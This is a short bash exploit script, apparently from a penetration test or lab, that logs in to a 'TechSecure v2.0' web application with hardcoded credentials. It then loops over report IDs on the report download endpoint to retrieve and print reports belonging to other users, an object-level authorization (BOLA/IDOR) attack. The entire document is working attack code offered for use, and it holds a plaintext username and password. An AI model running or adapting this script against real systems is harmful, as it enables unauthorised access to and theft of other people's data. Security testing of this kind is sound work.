#!/usr/bin/env bash
# BOLA enumeration against the TechSecure v2.0 report download endpoint.
# Attempts to download reports belonging to other users by iterating
# over report IDs.
#
# Usage: ./bola_report_enumeration.sh

set -euo pipefail

TARGET_HOST="10.216.27.100:8080"
USERNAME="budi.santoso"
PASSWORD="Budi12345"
ID_RANGE="1 2 3"
COOKIE_JAR="/tmp/techsecure_cookies.txt"
OUTPUT_DIR="./downloaded_reports"

mkdir -p "${OUTPUT_DIR}"

echo "[*] Authenticating as ${USERNAME}..."
curl -s -c "${COOKIE_JAR}" -X POST "http://${TARGET_HOST}/index.php" \
  -d "user=${USERNAME}&pass=${PASSWORD}" -o /dev/null

echo "[*] Attempting to download reports across ID range..."
for id in ${ID_RANGE}; do
  curl -s -b "${COOKIE_JAR}" "http://${TARGET_HOST}/api/v1/reports/download.php?id=${id}" \
    -o "${OUTPUT_DIR}/report_${id}.txt"
  echo "report ${id}:"
  cat "${OUTPUT_DIR}/report_${id}.txt"
  echo "---"
  sleep 1
done
